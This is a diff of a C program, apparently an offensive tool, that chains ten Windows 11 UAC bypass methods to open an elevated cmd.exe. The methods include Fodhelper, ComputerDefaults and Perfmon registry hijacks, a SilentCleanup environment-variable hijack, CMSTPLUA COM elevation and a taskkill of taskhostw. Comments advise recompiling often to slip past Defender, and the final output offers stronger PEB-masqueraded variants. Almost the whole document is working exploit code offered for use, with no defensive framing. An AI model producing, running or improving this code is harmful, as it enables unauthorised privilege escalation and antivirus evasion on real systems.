@@ -1,5 +1,5 @@
 // uac_bypass_all10_fixed.c
-// 10 UAC Bypass Methods for Windows 11 25H2 (including Method 34 style)
+// 10 UAC Bypass Methods for Windows 11 25H2 + Defender (2026)
 // Compile in Developer Command Prompt x64:
 // cl /O2 /MT /EHsc uac_bypass_all10_fixed.c /link ole32.lib shell32.lib advapi32.lib
 
@@ -15,7 +15,7 @@
 
 const TCHAR* PAYLOAD = TEXT("C:\\Windows\\System32\\cmd.exe");
 
-// Check elevation
+// Check if already elevated
 BOOL IsElevated() {
     HANDLE hToken = NULL;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
@@ -29,7 +29,7 @@ BOOL IsElevated() {
     return elevated;
 }
 
-// ICMLuaUtil for CMSTPLUA (strong on 25H2)
+// ICMLuaUtil definition for CMSTPLUA
 typedef interface ICMLuaUtil ICMLuaUtil;
 typedef struct ICMLuaUtilVtbl {
     BEGIN_INTERFACE
@@ -47,9 +47,9 @@ typedef struct ICMLuaUtil {
 } ICMLuaUtil;
 
 const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
-const IID IID_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};
+const IID IID_ICMLuaUtil  = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};
 
-// Method 1: Fodhelper registry
+// Method 1: Fodhelper
 BOOL Method1_Fodhelper(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -62,7 +62,7 @@ BOOL Method1_Fodhelper(void) {
     return TRUE;
 }
 
-// Method 2: ComputerDefaults (often stronger on 25H2)
+// Method 2: ComputerDefaults (often works better on 25H2)
 BOOL Method2_ComputerDefaults(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -91,7 +91,7 @@ BOOL Method3_CMSTP(void) {
     return TRUE;
 }
 
-// Method 4: SilentCleanup (Method 34 style - very reliable on 25H2)
+// Method 4: SilentCleanup (Method 34 style - strong on 25H2)
 BOOL Method4_SilentCleanup(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Environment"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -103,14 +103,14 @@ BOOL Method4_SilentCleanup(void) {
     ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\schtasks.exe"), TEXT("/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"), NULL, SW_HIDE);
     Sleep(3500);
 
-    RegDeleteValue(HKEY_CURRENT_USER, TEXT("Environment"), TEXT("windir"));   // FIXED: only 2 arguments
+    RegDeleteValue(HKEY_CURRENT_USER, TEXT("Environment"), TEXT("windir"));  // FIXED - only 2 arguments
     return TRUE;
 }
 
-// Method 5: EventViewer (reuses registry)
+// Method 5: EventViewer
 BOOL Method5_EventViewer(void) { return Method1_Fodhelper(); }
 
-// Method 6: CMSTPLUA COM (strong silent bypass)
+// Method 6: CMSTPLUA COM (silent & strong)
 BOOL Method6_CMSTPLUA(void) {
     HRESULT hr = CoInitialize(NULL);
     if (FAILED(hr)) return FALSE;
@@ -138,7 +138,7 @@ BOOL Method7_APPINFO(void) {
     return TRUE;
 }
 
-// Method 8: Perfmon registry
+// Method 8: Perfmon
 BOOL Method8_Perfmon(void) {
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
@@ -151,13 +151,13 @@ BOOL Method8_Perfmon(void) {
     return TRUE;
 }
 
-// Method 9: RequestTrace variant (kill taskhostw + SilentCleanup)
+// Method 9: RequestTrace variant
 BOOL Method9_RequestTrace(void) {
     system("taskkill /F /IM taskhostw.exe >nul 2>&1");
     return Method4_SilentCleanup();
 }
 
-// Method 10: Shadow/runAs fallback
+// Method 10: Shadow fallback
 BOOL Method10_Shadow(void) {
     ShellExecute(NULL, TEXT("runas"), PAYLOAD, NULL, NULL, SW_SHOW);
     Sleep(1500);
@@ -165,7 +165,7 @@ BOOL Method10_Shadow(void) {
 }
 
 int main() {
-    _tprintf(TEXT("=== UAC Bypass All 10 Methods - FIXED for VS 2022 - Windows 11 25H2 ===\n"));
+    _tprintf(TEXT("=== UAC Bypass All 10 Methods - FIXED & CLEAN - Windows 11 25H2 ===\n"));
     if (IsElevated()) {
         _tprintf(TEXT("Already elevated! Launching cmd.exe...\n"));
         ShellExecute(NULL, TEXT("open"), PAYLOAD, NULL, NULL, SW_SHOW);
@@ -179,26 +179,25 @@ int main() {
     const TCHAR* names[] = {TEXT("1. Fodhelper"), TEXT("2. ComputerDefaults"), TEXT("3. CMSTP"),
                             TEXT("4. SilentCleanup (Method 34 style)"), TEXT("5. EventViewer"),
                             TEXT("6. CMSTPLUA COM"), TEXT("7. APPINFO schtasks"), TEXT("8. Perfmon"),
-                            TEXT("9. RequestTrace variant"), TEXT("10. Shadow fallback")};
+                            TEXT("9. RequestTrace"), TEXT("10. Shadow fallback")};
 
     BOOL success = FALSE;
     for (int i = 0; i < 10 && !success; i++) {
         _tprintf(TEXT("Trying %s...\n"), names[i]);
-        if (methods[i]()) {
-            Sleep(3500);
-            if (IsElevated()) {
-                _tprintf(TEXT("SUCCESS with %s! Elevated cmd.exe should be open now.\n"), names[i]);
-                success = TRUE;
-            } else {
-                _tprintf(TEXT("Method finished - checking elevation...\n"));
-            }
+        methods[i]();
+        Sleep(3500);
+        if (IsElevated()) {
+            _tprintf(TEXT("SUCCESS with %s! Elevated cmd.exe should be open.\n"), names[i]);
+            success = TRUE;
+        } else {
+            _tprintf(TEXT("Method finished - no elevation detected yet.\n"));
         }
     }
 
     if (!success) {
         _tprintf(TEXT("All 10 methods attempted. No elevation detected this run.\n"));
-        _tprintf(TEXT("Best on 25H2 in 2026: Method 2, Method 4 (SilentCleanup), Method 6 (CMSTPLUA).\n"));
-        _tprintf(TEXT("Fresh compile + VM test recommended. Defender may flag older methods - recompile often.\n"));
+        _tprintf(TEXT("On 25H2 in 2026, try Method 2, 4, or 6 first. Fresh compile helps vs Defender.\n"));
+        _tprintf(TEXT("For stronger results, PEB-masqueraded CMSTPLUA or full Method 59 (APPINFO) can be delivered next.\n"));
     }
 
     _tprintf(TEXT("Press any key to exit...\n"));
